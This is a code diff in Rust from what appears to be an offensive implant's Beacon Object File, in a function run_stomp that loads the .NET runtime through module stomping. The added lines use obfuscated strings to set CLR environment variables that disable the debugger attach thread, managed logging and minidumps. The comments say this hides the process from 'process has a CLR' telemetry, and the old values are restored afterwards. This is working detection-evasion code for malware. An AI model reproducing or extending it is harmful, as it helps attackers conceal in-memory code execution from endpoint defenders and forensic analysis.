@@ -1124,6 +1124,9 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 let mut old_zap = [0u8; 256];
                 let mut old_sn  = [0u8; 256];
                 let mut old_pub = [0u8; 256];
+                let mut old_dat = [0u8; 256]; // DisableAttachThread
+                let mut old_log = [0u8; 256]; // LogEnable
+                let mut old_dmd = [0u8; 256]; // DbgEnableMiniDump
                 let had_zap = get_env.is_some_and(|f| {
                     let k = obf!("COMPLUS_ZapDisable\0");
                     f(k.as_bytes().as_ptr(), old_zap.as_mut_ptr(), 256) > 0
@@ -1135,6 +1138,18 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 let had_pub = get_env.is_some_and(|f| {
                     let k = obf!("COMPLUS_GeneratePublisherEvidence\0");
                     f(k.as_bytes().as_ptr(), old_pub.as_mut_ptr(), 256) > 0
+                });
+                let had_dat = get_env.is_some_and(|f| {
+                    let k = obf!("COMPLUS_DisableAttachThread\0");
+                    f(k.as_bytes().as_ptr(), old_dat.as_mut_ptr(), 256) > 0
+                });
+                let had_log = get_env.is_some_and(|f| {
+                    let k = obf!("COMPLUS_LogEnable\0");
+                    f(k.as_bytes().as_ptr(), old_log.as_mut_ptr(), 256) > 0
+                });
+                let had_dmd = get_env.is_some_and(|f| {
+                    let k = obf!("COMPLUS_DbgEnableMiniDump\0");
+                    f(k.as_bytes().as_ptr(), old_dmd.as_mut_ptr(), 256) > 0
                 });
                 if let Some(se) = set_env {
                     let k1 = obf!("COMPLUS_ZapDisable\0");
@@ -1151,6 +1166,17 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     let k3 = obf!("COMPLUS_GeneratePublisherEvidence\0");
                     let v0 = obf!("0\0");
                     se(k3.as_bytes().as_ptr(), v0.as_bytes().as_ptr());
+                    // DisableAttachThread=1: CLR does not spawn the
+                    // DbgAttachThread (visible via thread enumeration; signal
+                    // for "process has a CLR" telemetry).
+                    let k4 = obf!("COMPLUS_DisableAttachThread\0");
+                    se(k4.as_bytes().as_ptr(), v1.as_bytes().as_ptr());
+                    // LogEnable=0: suppress CLR managed logging facility.
+                    let k5 = obf!("COMPLUS_LogEnable\0");
+                    se(k5.as_bytes().as_ptr(), v0.as_bytes().as_ptr());
+                    // DbgEnableMiniDump=0: no minidump on CLR-internal exception.
+                    let k6 = obf!("COMPLUS_DbgEnableMiniDump\0");
+                    se(k6.as_bytes().as_ptr(), v0.as_bytes().as_ptr());
                 }
 
                 // Macro to restore COMPLUS env vars; called on every early-return path
@@ -1175,6 +1201,24 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                                 se(k3.as_bytes().as_ptr(), old_pub.as_ptr());
                             } else {
                                 se(k3.as_bytes().as_ptr(), core::ptr::null());
+                            }
+                            let k4 = obf!("COMPLUS_DisableAttachThread\0");
+                            if had_dat {
+                                se(k4.as_bytes().as_ptr(), old_dat.as_ptr());
+                            } else {
+                                se(k4.as_bytes().as_ptr(), core::ptr::null());
+                            }
+                            let k5 = obf!("COMPLUS_LogEnable\0");
+                            if had_log {
+                                se(k5.as_bytes().as_ptr(), old_log.as_ptr());
+                            } else {
+                                se(k5.as_bytes().as_ptr(), core::ptr::null());
+                            }
+                            let k6 = obf!("COMPLUS_DbgEnableMiniDump\0");
+                            if had_dmd {
+                                se(k6.as_bytes().as_ptr(), old_dmd.as_ptr());
+                            } else {
+                                se(k6.as_bytes().as_ptr(), core::ptr::null());
                             }
                         }
                     };
